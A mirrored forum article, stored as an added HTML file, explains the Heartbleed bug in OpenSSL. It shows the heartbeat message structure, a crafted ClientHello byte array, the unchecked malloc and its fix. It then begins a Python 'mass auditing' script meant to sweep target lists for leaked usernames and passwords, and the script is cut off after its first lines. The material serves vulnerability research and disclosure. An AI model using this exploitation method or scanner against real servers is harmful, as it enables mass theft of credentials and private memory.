@@ -1,0 +1,1279 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">
+
+<!-- Mirrored from garage4hackers.com/content.php?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:25:20 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+		<meta name="keywords" content="length,0x00,extension,type,0x03" />
+		<meta name="description" content="TLS Heart Bleed Attack.
+
+This is one of the most scary bugs I have seen in the last few years. A lot of discussion is going on and there are quite a number of blogs regarding this. But I couldn't find anything that explicitly talks about the vulnerability and exploitation methods. Also many organizations have multiple https servers using openssl. So I have created this mas auditing tool that could scan them all in one click.
+
+https://bitbucket.org/fb1h2s/cve-2014-0160
+
+Scan:
+
+680
+
+
+TLS HearBeat Extension.
+
+The vulnerability lies in the implementation of TLS Heartbeat extension. There is common necessity 
+in an established ssl session to maintain the connection for a longer time.  The HeartBeat protocol extension is added to TLS for this reason. The HTTP keep-alive feature does the same but HB protocol allows a client to perform this action in much higher rate. 
+
+The client can send a Heart-Beat request message and the server has to respond" />
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="TLS Heart Bleed Attack.
+
+This is one of the most scary bugs I have seen in the last few years. A lot of discussion is going on and there are quite a number of blogs regarding this. But I couldn't find anything that explicitly talks about the vulnerability and exploitation methods. Also many organizations have multiple https servers using openssl. So I have created this mas auditing tool that could scan them all in one click.
+
+https://bitbucket.org/fb1h2s/cve-2014-0160
+
+Scan:
+
+680
+
+
+TLS HearBeat Extension.
+
+The vulnerability lies in the implementation of TLS Heartbeat extension. There is common necessity 
+in an established ssl session to maintain the connection for a longer time.  The HeartBeat protocol extension is added to TLS for this reason. The HTTP keep-alive feature does the same but HB protocol allows a client to perform this action in much higher rate. 
+
+The client can send a Heart-Beat request message and the server has to respond" />
+<meta property="og:url" content="content3174.html?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "vbcms";
+	var RELPATH = "content3174.html?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+    
+        <link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - CMS RSS Feed" href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" />
+    
+    <title>Garage4hackers Forum - CVE-2014-0160 Heartbleed Attack POC and Mass Scanner .</title>
+	
+		<link rel="stylesheet" type="text/css" href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," />
+	
+    <!--[if lt IE 8]>
+        <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
+    <![endif]-->
+    <!--[if lt IE 7]>
+	<script type="text/javascript">
+		window.LESS_THAN_IE7 = true;
+	</script>
+    <![endif]-->
+	<script type="text/javascript" src="clientscript/vbulletin_overlay6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_cms6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421">
+    </script>
+    <link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body style="text-align:left">
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id=""><a href="content5ee7.html?r=1-home">Home</a></li>
+						
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="content.html">Home</a></li>
+
+		
+	<li class="navbit lastnavbit"><span>CVE-2014-0160 Heartbleed Attack POC and Mass Scanner .</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/content.php?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:25:21 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+<div class="vbcms_content">
+<div id="doc3" class="yui-tvb-r3">
+	<div id="bd">
+		<div id="yui-main">
+			<div class="yui-b">
+				<div class="yui-gf">
+					<div class="yui-u first yui-panel">
+						<ul class="list_no_decoration widget_list" id="widgetlist_column1">
+<li><script type="text/javascript">
+<!--
+	var IMGDIR_MISC = "images/misc";
+	var vb_disable_ajax = parseInt("0", 10);
+
+        /* Start Sections Widget Configuration */
+        vbGlobal_SHOW_ALL_TREE_ELEMENTS_THRESHOLD = parseInt("5");
+        /* End Seections Widget Configuration */
+// -->
+</script>
+<script type="text/javascript">
+<!--
+	document.write('<script type="text/javascript" src="' + yuipath + '/treeview/treeview-min.js"></script>');
+	loadVbCss(yuipath + '/treeview/assets/skins/sam/treeview.css');
+//-->
+</script>
+<!-- end treeview css -->
+
+<!-- custom treeview styles defined at template: headinclude -->
+
+<!-- END VB Tree-Menu Implementation of YUI TreeView -->
+<div class="cms_widget">
+	<div class="block">
+		<div class="cms_widget_header">
+			<h3><img src="images/cms/sections.html" alt="" /> Menu</h3>
+		</div>
+		<div class="cms_widget_content widget_content">
+			<div class="vb-tree-menu">
+				<ul >
+<li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
+</li>
+<li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
+</li>
+<li><a href="content8f5d.html?r=2-garage4hackers-exploits" title="G4H Exploits">G4H Exploits</a>
+</li>
+<li><a href="content7820.html?r=107-ctf-amp-meet-writeups" title="CTF &amp; Meet Writeups">CTF &amp; Meet Writeups</a>
+</li>
+<li><a href="content0b4f.html?r=128-google-vulnerabilities" title="Google Hall of Fame">Google Hall of Fame</a>
+</li>
+<li><a href="contentf20a.html?r=134-teensy" title="Teensy">Teensy</a>
+</li>
+<li><a href="content93b9.html?r=136-webapp-exploits" title="Bug Bounty Listing">Bug Bounty Listing</a>
+</li>
+<li><a href="contentdb2e.html?r=151-web-application-security" title="Web Application Security">Web Application Security</a>
+</li>
+<li><a href="contentc520.html?r=163-exploitation-techniques" title="Exploitation Techniques">Exploitation Techniques</a>
+</li>
+<li><a href="content90cc.html?r=172-ranchoddas-webcast-recording" title="RWS Webcast Recording">RWS Webcast Recording</a>
+</li>
+<li><a href="contente989.html?r=179-blogs" title="Blogs">Blogs</a>
+</li></ul>
+ 
+			</div>
+				<noscript>
+					<div class="cms_widget_sectionnav">
+						<div class="cms_widget_sectionnav_page">
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers">G4H Tutorial and Papers</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="content842d.html?r=4-g4h-tools-and-scripts">G4H Tools and Scripts</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="content8f5d.html?r=2-garage4hackers-exploits">G4H Exploits</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="content7820.html?r=107-ctf-amp-meet-writeups">CTF &amp; Meet Writeups</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="content0b4f.html?r=128-google-vulnerabilities">Google Hall of Fame</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="contentf20a.html?r=134-teensy">Teensy</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="content93b9.html?r=136-webapp-exploits">Bug Bounty Listing</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="contentdb2e.html?r=151-web-application-security">Web Application Security</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="content90cc.html?r=172-ranchoddas-webcast-recording">RWS Webcast Recording</a></div>
+							
+								
+									<div class="main_menuitem" style="text-indent:20px">
+								
+								<a href="contente989.html?r=179-blogs">Blogs</a></div>
+							
+						</div>
+					</div>
+				</noscript>			
+		</div>
+	</div>
+</div>
+
+<script type="text/javascript">
+	initVbTreeMenus(false);
+</script></li>
+</ul>
+					</div>
+					<div class="yui-u yui-panel">
+						<ul class="list_no_decoration widget_list" id="widgetlist_column2">
+<li><!-- styles defined in template: headinclude -->
+
+
+
+<div class="article_width" id="article_content">
+	<div class="title">
+                <h1 class="article_title cms_article_title"><span>CVE-2014-0160 Heartbleed Attack POC and Mass Scanner .</span>
+                        
+		</h1>
+	</div>
+	<div class="article_author_date_comment_container">
+                
+		<div class="fullwidth">
+			
+				<div>
+<fb:like href="content3174.html?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like></div>
+			
+			
+				<div class="article_username_container">
+					by <div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="membere81f.html?u=8" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		<li class="left">
+			<a href="index.html" class="siteicon_homepage">
+				Visit Homepage
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				</div>
+			
+                        
+                                <div class="article_rating_container">
+                                        <div class="popupmenu cmsratingmenu" id="cmsrating">
+                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current">Rate this article</a></h6>
+                                                <form action="../external.html?link=http://garage4hackers.com/content.php?168/rate" method="post" id='cms_cmsrate_form'>
+                                                        <ul class="popupbody popuphover">
+                                                                
+                                                                        <li><label for="r5"><span class="rating5 cmsrating right">
+                                                                                <input type="radio" name="vote" value="5" id="r5"  tabindex="1" /> Excellent
+                                                                        </span></label></li>
+                                                                        <li><label for="r4"><span class="rating4 cmsrating right">
+                                                                                <input type="radio" name="vote" value="4" id="r4"  tabindex="1" /> Good
+                                                                        </span></label></li>
+                                                                        <li><label for="r3"><span class="rating3 cmsrating right">
+                                                                                <input type="radio" name="vote" value="3" id="r3"  tabindex="1" /> Average
+                                                                        </span></label></li>
+                                                                        <li><label for="r2"><span class="rating2 cmsrating right">
+                                                                                <input type="radio" name="vote" value="2" id="r2"  tabindex="1" /> Bad
+                                                                        </span></label></li>
+                                                                        <li><label for="r1"><span class="rating1 cmsrating right">
+                                                                                <input type="radio" name="vote" value="1" id="r1"  tabindex="1" /> Terrible
+                                                                        </span></label></li>
+                                                                        <li class="formsubmit"><input type="submit" class="button" value="Vote Now" tabindex="1" /></li>
+                                                                
+                                                        </ul>
+                                                        <input type="hidden" name="s" value="" />
+                                                        <input type="hidden" name="securitytoken" value="guest" />
+                                                </form>
+                                                <script type="text/javascript" src="clientscript/cms_ajax_rate6719.html?v=421"></script>
+                                                <script type="text/javascript">
+                                                <!--
+                                                        var nodeid = 168;
+                                                        vB_AJAX_CMSRate_Init('cms_cmsrate_form');
+                                                //-->
+                                                </script>
+                                        </div>
+                                </div>
+                        
+                        <div class="cms_clear"></div>
+                        
+				<div class=" article_username_container ">
+					
+						
+							Published on 04-09-2014  09:58 PM
+						
+					
+					
+						&nbsp;
+						&nbsp;
+					
+					
+						&nbsp;Number of Views: 13448
+						&nbsp;
+					
+				</div>
+			
+                       
+                        <div class="article_rating_container">
+                            	<a href="content3174.html?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner#comments"  rel="nofollow"><span id="comments_top_count">1</span> <span id="comments_top_text"> Comment</span></a>
+				<img src="images/misc/comment.html" alt="Comments" border="0" />
+                        </div>
+                       
+		</div>
+	</div>
+    
+    <div class="clear"></div>
+	<div class="article cms_clear restore postcontainer">TLS Heart Bleed Attack.<br />
+<br />
+This is one of the most scary bugs I have seen in the last few years. A lot of discussion is going on and there are quite a number of blogs regarding this. But I couldn't find anything that explicitly talks about the vulnerability and exploitation methods. Also many organizations have multiple https servers using openssl. So I have created this mas auditing tool that could scan them all in one click.<br />
+<br />
+<a href="../external.html?link=https://bitbucket.org/fb1h2s/cve-2014-0160" target="_blank">https://bitbucket.org/fb1h2s/cve-2014-0160</a><br />
+<br />
+<u><b>Scan:<br />
+</b></u><br />
+<img src="attachment0efa.jpg?attachmentid=680&amp;d=1397060917" border="0" alt=""  style="float: CONFIG" /><br />
+<br />
+<br />
+TLS HearBeat Extension.<br />
+<br />
+The vulnerability lies in the implementation of TLS Heartbeat extension. There is common necessity <br />
+in an established ssl session to maintain the connection for a longer time.  The HeartBeat protocol extension is added to TLS for this reason. The HTTP keep-alive feature does the same but HB protocol allows a client to perform this action in much higher rate. <br />
+<br />
+The client can send a Heart-Beat request message and the server has to respond back with a HearBeat response .<br />
+<a href="../external.html?link=https://tools.ietf.org/html/rfc6520#page-2" target="_blank">https://tools.ietf.org/html/rfc6520#page-2</a><br />
+<br />
+So in short the Heartbeat Protocol is simple and has a request and response module. <br />
+<br />
+heartbeat_request(1),<br />
+heartbeat_response(2),<br />
+<br />
+<u>The following is the structure of a HB protocol. <br />
+</u><br />
+The following is heartbeat protocol .<br />
+<br />
+  <div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:96px;"> struct {
+      HeartbeatMessageType type;
+      uint16 payload_length;
+      opaque payload[HeartbeatMessage.payload_length];
+      opaque padding[padding_length];
+   } HeartbeatMessage;</pre>
+</div>Here the Message Type is 1 byte, payload_length is 2 byte and necessary padding based on payload .<br />
+<br />
+So the entire heartbeat protocol is an addon for openssl . This following is the structure for a TLS packet with HB addon.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">const unsigned char good_data_2[] = {
+    // TLS record
+    0x16, // Content Type: Handshake
+    0x03, 0x01, // Version: TLS 1.0
+    0x00, 0x6c, // Length (use for bounds checking)
+        // Handshake
+        0x01, // Handshake Type: Client Hello
+        0x00, 0x00, 0x68, // Length (use for bounds checking)
+        0x03, 0x03, // Version: TLS 1.2
+        // Random (32 bytes fixed length)
+        0xb6, 0xb2, 0x6a, 0xfb, 0x55, 0x5e, 0x03, 0xd5,
+        0x65, 0xa3, 0x6a, 0xf0, 0x5e, 0xa5, 0x43, 0x02,
+        0x93, 0xb9, 0x59, 0xa7, 0x54, 0xc3, 0xdd, 0x78,
+        0x57, 0x58, 0x34, 0xc5, 0x82, 0xfd, 0x53, 0xd1,
+        0x00, // Session ID Length (skip past this much)
+        0x00, 0x04, // Cipher Suites Length (skip past this much)
+            0x00, 0x01, // NULL-MD5
+            0x00, 0xff, // RENEGOTIATION INFO SCSV
+        0x01, // Compression Methods Length (skip past this much)
+            0x00, // NULL
+        0x00, 0x3b, // Extensions Length (use for bounds checking)
+            // Extension
+            0x00, 0x00, // Extension Type: Server Name (check extension type)
+            0x00, 0x0e, // Length (use for bounds checking)
+            0x00, 0x0c, // Server Name Indication Length
+                0x00, // Server Name Type: host_name (check server name type)
+                0x00, 0x09, // Length (length of your data)
+                // &quot;localhost&quot; (data your after)
+                0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74,
+            // Extension
+            0x00, 0x0d, // Extension Type: Signature Algorithms (check extension type)
+            0x00, 0x20, // Length (skip past since this is the wrong extension)
+            // Data
+            0x00, 0x1e, 0x06, 0x01, 0x06, 0x02, 0x06, 0x03,
+            0x05, 0x01, 0x05, 0x02, 0x05, 0x03, 0x04, 0x01,
+            0x04, 0x02, 0x04, 0x03, 0x03, 0x01, 0x03, 0x02,
+            0x03, 0x03, 0x02, 0x01, 0x02, 0x02, 0x02, 0x03,
+            // Extension
+            0x00, 0x0f, <b><u>// Extension Type: Heart Beat (check extension type)</u></b>
+            0x00, 0x01, // Length (skip past since this is the wrong extension)
+            0x01 // Mode: Peer allows to send requests
+};</pre>
+</div><br />
+The bugg code was an insecure malloc <a href="../external.html?link=https://github.com/openssl/openssl/commit/96db9023b881d7cd9f379b0c154650d6c108e9a3#diff-2" target="_blank">https://github.com/openssl/openssl/c...108e9a3#diff-2</a><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:48px;">
+buffer = OPENSSL_malloc(1 + 2 + payload + padding);</pre>
+</div>In the above code memory is allocated from the payload + padding which is a user controlled value.  There was no length check for this particular allocation and an attacker could force the Openssl server to read arbitrary memory locations.<br />
+<br />
+<br />
+<br />
+The total length of a HeartbeatMessage does NOT exceed 2^14 or max_fragment_length when negotiated as defined in [RFC6066]. Here we are only able to leak 64 kb of memory and that could easily have usernames/password etc. Even though openssllib has loaded the server secret keys somewhere in memory it very unlikely to access that using this bug due the the heap allocations.  <br />
+<br />
+Constant HB request could be made to the server leaking (random memory) any amount of data from the server .<br />
+<br />
+The fix to this bug was to simply bound check the payload + padding length to not exceed 16 bytes .<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:60px;">unsigned int write_length = 1 /* heartbeat type */ +
+ +                        2 /* heartbeat length */ +
+ +                        payload + padding;</pre>
+</div><br />
+As well as to not allow the HB length to exceed the max length.<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:96px;">unsigned int write_length = 1 /* heartbeat type */ +
+ +                        2 /* heartbeat length */ +
+ +                        payload + padding;
+  
+ +        if (write_length &gt; SSL3_RT_MAX_PLAIN_LENGTH)
+ +            return 0;</pre>
+</div><br />
+Exploitation:<br />
+<br />
+I have created a Mass Auditing tool. So that you can give in a huge range of targets as a list and the tool would find important informations for you.  Give it a list of targets and it would detect the vulnerability and list out if any username password is found. <br />
+<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">import socket, ssl, pprint
+import Queue
+import threading,time,sys,select,struct,urllib,time,re,os
+
+
+'''
+
+    16 03 02 00 31 # TLS Header
+    01 00 00 2d # Handshake header
+    03 02 # ClientHello field: version number (TLS 1.1)
+    50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 \
+    33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96 # ClientHello field: random
+    00 # ClientHello field: session id
+    00 04 # ClientHello field: cipher suite length
+    00 33 c0 11 # ClientHello field: cipher suite(s)
+    01 # ClientHello field: compression support, length
